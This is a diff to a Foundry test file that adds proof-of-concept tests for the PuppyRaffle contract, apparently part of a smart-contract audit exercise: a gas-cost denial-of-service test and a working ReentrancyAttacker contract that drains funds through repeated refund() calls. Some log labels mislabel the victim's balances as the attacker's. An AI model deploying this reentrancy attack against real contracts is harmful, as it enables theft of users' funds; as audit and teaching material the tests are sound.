@@ -213,4 +213,98 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
     }
+    //////////////////////
+    /// PoCs         ///
+    /////////////////////
+
+    function testDenialOfService() public  {
+        // declare the first 100 players
+        vm.txGasPrice(1);
+        uint256 playersNum = 100;
+        address[] memory players = new address[](playersNum); //reserve space for 100 elements
+
+        for(uint256 i = 0; i < playersNum; i++) {
+            players[i] = address(i);
+        }
+        uint256 gasStart = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
+        uint256 gasEnd = gasleft();
+
+        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
+        console.log("Gas cost for the first 100 player", gasUsedFirst);
+
+        // second entry
+        address[] memory playersTwo = new address[](playersNum); //reserve space for another 100 players
+        for(uint256 i = 0; i < playersNum; i++) {
+            playersTwo[i] = address(i + 100);
+        }
+        uint256 gasStartTwo = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(playersTwo);
+        uint256 gasEndTwo = gasleft();
+
+        uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;
+        console.log("Gas cost for the first 100 player", gasUsedSecond);
+
+        assert(gasUsedSecond > gasUsedFirst);
+    }
+
+    function test_ReentrancyRefund() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
+        address attackUser = makeAddr("attackUser");
+        vm.deal(attackUser, 1 ether);
+
+        uint256 startingAttackContractBalance = address(attackerContract).balance;
+        uint256 startingVictimContractBalance = address(puppyRaffle).balance;
+
+        vm.prank(attackUser);
+        attackerContract.attack{value: entranceFee}();
+
+        console.log("Starting attacker contract balance: ", startingAttackContractBalance);
+        console.log("Starting attacker contract balance: ", startingVictimContractBalance);
+    
+        console.log("Ending attacker contract balance: ", address(attackerContract).balance);
+        console.log("Ending attacker contract balance: ", address(puppyRaffle).balance);
+    }
+
+}
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyraffle) {
+        puppyRaffle = _puppyraffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    function _stealMoney() internal {
+        if(address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+    fallback() external payable {
+        _stealMoney();
+    }
+
+    receive() external payable {
+        _stealMoney();
+    }
+
+
 }
